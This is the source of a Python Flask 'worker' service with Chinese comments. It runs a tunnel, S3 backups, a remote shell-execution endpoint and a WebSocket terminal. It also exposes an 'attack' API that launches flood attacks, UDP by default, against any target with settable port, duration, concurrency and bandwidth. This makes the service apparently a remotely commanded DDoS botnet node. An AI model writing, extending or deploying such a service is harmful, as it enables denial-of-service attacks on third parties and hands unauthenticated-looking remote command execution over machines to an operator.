# -*- coding: utf-8 -*-
"""
Worker Flask App + 路由 + WSS 终端 + 启动入口

两阶段启动：
  阶段1（立即）：init_instance → 隧道 → Flask（保证域名可访问）
  阶段2（后台）：数据恢复 → 系统配置 → 进程恢复 → MCP → Leader → 后台循环
"""
import os
import io
import json
import time
import select
import signal
import functools
import threading
import subprocess
import urllib.request

from flask import Flask, request, jsonify
from flask_socketio import SocketIO

import config
import log
from core import lock as core_lock
from core import status as core_status
from core.s3 import S3Pool
from core import releases
from worker import state, persistence, terminal, attack, upload_queue
from worker.tunnel import TunnelManager
from worker.mcp import McpManager
from worker.process.manager import ProcessManager
from worker.process import api as proc_api
from worker.boot import deferred_init
from worker.loops import start_loops

app = Flask(__name__)
app.config["SECRET_KEY"] = os.urandom(24).hex()
socketio = SocketIO(app, cors_allowed_origins="*", async_mode="threading",
                    ping_timeout=60, ping_interval=25)
logger = log.setup_logger("worker")

log.clear_logs()

JOB_STATE = {"last_url": "", "load_status": state.load_status}


def init_instance():
    """读取实例配置。S3 优先，Releases 降级。"""
    cfg = {}
    if state.s3pool and state.s3pool.is_ready():
        data = state.s3pool.get_meta_json(
            f"meta/inst-config/{config.INSTANCE_ID}.json", default=None)
        if data and isinstance(data, dict):
            cfg = data
            logger.info(f"从 S3 加载实例配置: {config.INSTANCE_ID}")
    if not cfg:
        cfg = releases.load_json_enc(f"inst-{config.INSTANCE_ID}.json.enc", default={})
        if cfg:
            logger.info(f"从 Releases 加载实例配置: {config.INSTANCE_ID}")
    state.inst_cfg = config.InstanceConfig(config.INSTANCE_ID, cfg)
    logger.info(f"实例 {config.INSTANCE_ID}: host={state.inst_cfg.tunnel_host}")
    return state.inst_cfg



# ==================== 500 错误处理 ====================
@app.errorhandler(500)
def _handle_500(e):
    import traceback
    return jsonify(ok=False, error=str(e),
                   traceback=traceback.format_exc()[:2000]), 500



# ==================== 500 错误处理（不黑盒）====================
@app.errorhandler(Exception)
def _handle_error(e):
    import traceback
    from werkzeug.exceptions import HTTPException
    code = e.code if isinstance(e, HTTPException) else 500
    if code == 404:
        return jsonify(ok=False, error="Not Found"), 404
    return jsonify(ok=False, error=str(e),
                   traceback=traceback.format_exc()[:2000]), code

# ==================== 认证 ====================
def _check(data=None):
    token = ""
    if isinstance(data, dict):
        token = data.get("token", "")
    if not token:
        token = request.headers.get("Authorization", "").replace("Bearer ", "").strip()
    if not token:
        token = request.args.get("token", "")
    return bool(config.EXEC_TOKEN) and token == config.EXEC_TOKEN


def require_auth(f):
    """鉴权装饰器（/api/health 和 / 除外，探活用）"""
    @functools.wraps(f)
    def wrapper(*args, **kwargs):
        if not _check():
            return jsonify(ok=False, error="未授权"), 401
        return f(*args, **kwargs)
    return wrapper


# ==================== 路由 ====================
@app.route("/")
def index():
    return jsonify(ok=True, instance=config.INSTANCE_ID, job=core_lock.JOB_ID,
                   elapsed=core_status.elapsed(),
                   leader=state.leader.is_leader if state.leader else False,
                   url=JOB_STATE["last_url"])


@app.route("/api/health")
def health():
    return jsonify(ok=True, instance=config.INSTANCE_ID, elapsed=core_status.elapsed())


@app.route("/api/status")
@require_auth
def status():
    return jsonify(ok=True, instance=config.INSTANCE_ID, job_id=core_lock.JOB_ID,
                   elapsed=core_status.elapsed(),
                   leader=state.leader.is_leader if state.leader else False,
                   url=JOB_STATE["last_url"], source=state.load_status,
                   tunnel_host=state.inst_cfg.tunnel_host if state.inst_cfg else config.TUNNEL_HOST)


@app.route("/api/logs")
@require_auth
def logs():
    limit = max(10, min(int(request.args.get("limit", 300)), 2000))
    return jsonify(ok=True, logs=log.get_logs(
        limit=limit, level=request.args.get("level"),
        module=request.args.get("module"), keyword=request.args.get("keyword")),
        stats=log.get_stats())


@app.route("/api/resource")
@require_auth
def resource():
    stats = log.get_resource_stats()
    stats["elapsed"] = core_status.elapsed()
    return jsonify(ok=True, **stats)


@app.route("/api/exec", methods=["POST"])
def exec_cmd():
    data = request.get_json(silent=True) or {}
    if not _check(data):
        return jsonify(ok=False, error="未授权"), 403
    cmd = (data.get("cmd") or "").strip()
    if not cmd or len(cmd) > 2000:
        return jsonify(ok=False, error="命令为空或过长"), 400
    timeout = max(1, min(int(data.get("timeout", 30)), 600))
    try:
        proc = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return jsonify(ok=True, code=proc.returncode,
                       stdout=proc.stdout[-4000:], stderr=proc.stderr[-2000:])
    except subprocess.TimeoutExpired:
        return jsonify(ok=False, error=f"超时({timeout}s)"), 500
    except Exception as e:
        return jsonify(ok=False, error=str(e)), 500


@app.route("/api/backup", methods=["POST"])
def backup():
    if not _check():
        return jsonify(ok=False, error="未授权"), 401
    if state.leader and not state.leader.is_leader:
        return jsonify(ok=False, error="备份节点"), 503
    try:
        db_size, _ = persistence.backup_database(state.inst_cfg)
        res = persistence.backup_files(state.inst_cfg)
        return jsonify(ok=True, db_size=db_size, files_size=res[0] if res else 0)
    except Exception as e:
        return jsonify(ok=False, error=str(e)), 500


_backup_lock = threading.Lock()
_backup_running = False


@app.route("/api/backup/now", methods=["POST"])
def backup_now():
    global _backup_running
    if not _check():
        return jsonify(ok=False, error="未授权"), 403
    with _backup_lock:
        if _backup_running:
            return jsonify(ok=False, error="备份进行中"), 409
        _backup_running = True
    try:
        t0 = time.time()
        _ba, _bb = 0, 0
        if state.s3pool and state.s3pool.is_ready():
            _s = state.s3pool.get_status()
            _ba, _bb = _s.get("total_a_ops", 0), _s.get("total_b_ops", 0)
        db_size, _ = persistence.backup_database(state.inst_cfg)
        res = persistence.backup_files(state.inst_cfg)
        if state.proc_mgr:
            state.proc_mgr.snapshot(reason="manual_now")
        elapsed = time.time() - t0
        _aa, _ab = _ba, _bb
        if state.s3pool and state.s3pool.is_ready():
            _s = state.s3pool.get_status()
            _aa, _ab = _s.get("total_a_ops", 0), _s.get("total_b_ops", 0)
        _da, _db = max(0, _aa - _ba), max(0, _ab - _bb)
        _size = int(db_size or 0) + int((res[0] if res else 0))
        persistence.record_backup("success", _size,
            f"db={db_size}B files={res[0] if res else 0}MB elapsed={elapsed:.1f}s",
            _da, _db)
        logger.info(f"完成 ({elapsed:.1f}s)")
        return jsonify(ok=True, db_size=db_size,
                       files_size=res[0] if res else 0, elapsed=round(elapsed, 1))
    except Exception as e:
        persistence.record_backup("failed", 0, str(e), 0, 0)
        logger.error(f"失败: {e}")
        return jsonify(ok=False, error=str(e)), 500
    finally:
        _backup_running = False


@app.route("/api/term/screen")
@require_auth
def term_screen():
    return jsonify(ok=True, screen=terminal.get_screen(request.args.get("session", "")))


# ==================== MCP 开关 ====================
@app.route("/api/mcp/toggle", methods=["POST"])
def toggle_mcp():
    """启动/关闭 MCP 服务（配置持久化，续命时自动读取）"""
    data = request.get_json(silent=True) or {}
    if not _check(data):
        return jsonify(ok=False, error="未授权"), 401
    enabled = data.get("enabled", True)
    # 更新实例配置内存
    if state.inst_cfg and state.inst_cfg.raw:
        state.inst_cfg.raw["mcp_enabled"] = enabled
    if enabled:
        if not state.mcp_mgr:
            try:
                state.mcp_mgr = McpManager(state.inst_cfg)
                state.mcp_mgr.start()
                return jsonify(ok=True, msg="MCP 已启动")
            except Exception as e:
                return jsonify(ok=False, error=str(e)), 500
        return jsonify(ok=True, msg="MCP 已在运行")
    else:
        if state.mcp_mgr:
            try:
                state.mcp_mgr.stop()
            except Exception as e:
                logger.debug(f"stop 异常: {e}")
            state.mcp_mgr = None
        return jsonify(ok=True, msg="MCP 已关闭")


# ==================== 优雅关闭 ====================
@app.route("/api/shutdown", methods=["POST"])
def graceful_shutdown():
    """优雅关闭：备份→上报→退出（收到 manager 的重启通知）"""
    data = request.get_json(silent=True) or {}
    if not _check(data):
        return jsonify(ok=False, error="未授权"), 401

    def _do_shutdown():
        import time as _t
        state.shutting_down = True  # 立即停止上报/备份/续命循环
        _t.sleep(1)  # 确保响应已发送
        logger.warning("收到优雅关闭请求，开始备份")
        try:
            if state.proc_mgr:
                result = state.proc_mgr.final_snapshot()
            else:
                _dbs, _ = persistence.backup_database(state.inst_cfg)
                _res = persistence.backup_files(state.inst_cfg)
                result = (_dbs, _res[0] if _res else 0)
            # Flush Releases 异步队列（确保双写副本到位）
            try:
                upload_queue.stop_queue(flush=True)
                logger.info("Releases 队列 flush 完成")
            except Exception as e:
                logger.warning(f"Releases 队列 flush 异常: {e}")
            if result:
                db_size, files_size = result
                _size = int(db_size or 0) + int(files_size or 0)
                persistence.record_backup("pre-shutdown", _size,
                    f"shutdown: db={db_size}B files={files_size/1048576:.1f}MB", 0, 0)
            logger.info("备份完成")
        except Exception as e:
            logger.error(f"备份失败: {e}")
        # 上报 manager
        try:
            from core.utils import http_request
            url = f"https://{config.MANAGER_HOST}/api/instances/{config.INSTANCE_ID}/shutdown-complete"
            http_request(url, method="POST",
                data=json.dumps({"token": config.EXEC_TOKEN}).encode(),
                headers={"Content-Type": "application/json"},
                timeout=10, retries=2)
        except Exception as e:
            logger.warning(f"上报失败: {e}")
        logger.warning("退出")
        os._exit(0)

    threading.Thread(target=_do_shutdown, daemon=True).start()
    return jsonify(ok=True, msg="正在备份并关闭")


# ==================== Releases 队列诊断 ====================
@app.route("/api/releases/queue")
@require_auth
def releases_queue_status():
    st = upload_queue.queue_status()
    st.pop("ok", None)  # 避免与 jsonify 的 ok 冲突
    return jsonify(ok=True, **st)


# ==================== 攻击 API ====================
@app.route("/api/attack/start", methods=["POST"])
def attack_start():
    data = request.get_json(silent=True) or {}
    if not _check(data):
        return jsonify(ok=False, error="未授权"), 401
    if attack.attack_state["running"]:
        return jsonify(ok=False, error="已有攻击在运行"), 409
    target = (data.get("target") or "").strip()
    if not target:
        return jsonify(ok=False, error="target 必填"), 400
    ok, msg = attack.start_attack(
        target=target, mode=(data.get("type") or "udp").strip(),
        port=int(data.get("port", 80)), duration=int(data.get("duration", 60)),
        concurrency=int(data.get("concurrency", 100)),
        bandwidth=int(data.get("bandwidth", 0)),
        packet_size=int(data.get("packet_size", 1024)))
    return jsonify(ok=ok, msg=msg) if ok else jsonify(ok=False, error=msg), 500


@app.route("/api/attack/stop", methods=["POST"])
def attack_stop():
    data = request.get_json(silent=True) or {}
    if not _check(data):
        return jsonify(ok=False, error="未授权"), 401
    ok, msg = attack.stop_attack()
    return jsonify(ok=ok, msg=msg)


@app.route("/api/attack/status")
@require_auth
def attack_status():
    return jsonify(ok=True, **attack.attack_status())


# ==================== WSS 终端 ====================
def _pty_reader(session_key, sid):
    sess = terminal.SESSIONS.get(session_key)
    if not sess:
        return
    buf = b""
    try:
        while sess.attached:
            r, _, _ = select.select([sess.fd], [], [], 0.05)
            if r:
                data = sess.read_output()
                if data is None:
                    break
                if data:
                    buf += data
                    try:
                        text = buf.decode("utf-8")
                        buf = b""
                    except UnicodeDecodeError:
                        for i in range(1, min(5, len(buf) + 1)):
                            try:
                                text = buf[:-i].decode("utf-8")
                                buf = buf[-i:]
                                break
                            except UnicodeDecodeError:
                                continue
                        else:
                            text = buf.decode("utf-8", errors="replace")
                            buf = b""
                    if text:
                        sess.feed(text.encode("utf-8"))
                        socketio.emit("output", text, to=sid)
            else:
                wpid, status = os.waitpid(sess.pid, os.WNOHANG)
                if wpid == sess.pid:
                    if buf:
                        socketio.emit("output", buf.decode("utf-8", errors="replace"), to=sid)
                    socketio.emit("exit", {"code": status}, to=sid)
                    break
    except Exception as e:
        logger.debug(f"信号处理异常: {e}")


@socketio.on("connect")
def ws_connect(auth):
    token = ""
    session_key = ""
    if isinstance(auth, dict):
        token = auth.get("token", "")
        session_key = auth.get("session", "")
    if not config.EXEC_TOKEN or token != config.EXEC_TOKEN:
        return False
    if not session_key:
        session_key = f"{config.INSTANCE_ID}-{core_lock.JOB_ID}"
    sess = terminal.get_or_create_session(session_key)
    state._sid_to_key[request.sid] = session_key
    threading.Thread(target=_pty_reader, args=(session_key, request.sid), daemon=True).start()
    socketio.emit("session", {"session_key": session_key}, to=request.sid)


@socketio.on("input")
def ws_input(data):
    session_key = state._sid_to_key.get(request.sid, "")
    sess = terminal.SESSIONS.get(session_key)
    if sess:
        sess.write_input(data if isinstance(data, bytes) else data.encode("utf-8"))


@socketio.on("resize")
def ws_resize(data):
    session_key = state._sid_to_key.get(request.sid, "")
    sess = terminal.SESSIONS.get(session_key)
    if sess:
        try:
            sess.resize(int(data.get("rows", 24)), int(data.get("cols", 80)))
        except Exception as e:
            logger.debug(f"pty读取异常: {e}")


@socketio.on("disconnect")
def ws_disconnect():
    session_key = state._sid_to_key.pop(request.sid, "")
    if session_key:
        terminal.detach_session(session_key)


# ==================== 优雅关闭 ====================
def _signal_handler(signum, frame):
    logger.warning(f"信号 {signum}，最终快照")
    try:
        # final_snapshot 内部已含 backup_database + backup_files，避免重复备份
        if state.proc_mgr:
            state.proc_mgr.final_snapshot()
        else:
            persistence.backup_database(state.inst_cfg)
            persistence.backup_files(state.inst_cfg)
        if state.mcp_mgr:
            state.mcp_mgr.stop()
        try:
            upload_queue.stop_queue(flush=True)
        except Exception:
            pass
    except Exception as e:
        logger.error(f"备份失败: {e}")
    os._exit(0)


# ==================== 启动 ====================
def run():
    t0 = time.time()
    logger.info(f"=== Worker 启动: {config.INSTANCE_ID} ===")

    # S3 初始化
    bootstrap = os.environ.get("S3_BOOTSTRAP", "")
    if bootstrap:
        state.s3pool = S3Pool(bootstrap, config.S3_ENDPOINT, config.S3_REGION, owner=config.INSTANCE_ID)
        if state.s3pool.init():
            persistence.set_s3pool(state.s3pool)
            logger.info("S3 池初始化成功")
        else:
            logger.error("S3 池初始化失败，降级 Releases")
            state.s3pool = None
    else:
        logger.warning("无 S3_BOOTSTRAP，仅用 Releases")

    # 阶段1：最小启动
    init_instance()
    os.makedirs(config.FILES_DIR, exist_ok=True)
    os.makedirs(config.LOGS_DIR, exist_ok=True)
    signal.signal(signal.SIGTERM, _signal_handler)
    signal.signal(signal.SIGINT, _signal_handler)

    state.tunnel_mgr = TunnelManager(state.inst_cfg)
    JOB_STATE["last_url"] = state.tunnel_mgr.url
    state.tunnel_mgr.start_async()
    logger.info(f"隧道已异步启动: {state.tunnel_mgr.url} ({time.time()-t0:.1f}s)")

    # 进程管理器 + API
    state.proc_mgr = ProcessManager(state.inst_cfg, state.s3pool)
    proc_api.init_process_api(state.proc_mgr)
    app.register_blueprint(proc_api.bp)

    # Releases 异步上传队列
    try:
        upload_queue.start_queue()
    except Exception as e:
        logger.error(f"Releases 上传队列启动失败: {e}")

    # 阶段2：延迟初始化（后台线程）
    threading.Thread(target=deferred_init, daemon=True).start()

    # Flask 服务（阻塞）
    log.request_logger(app)
    logger.info(f"Flask 端口 {config.PORT} ({time.time()-t0:.1f}s)")
    socketio.run(app, host="0.0.0.0", port=config.PORT, allow_unsafe_werkzeug=True)
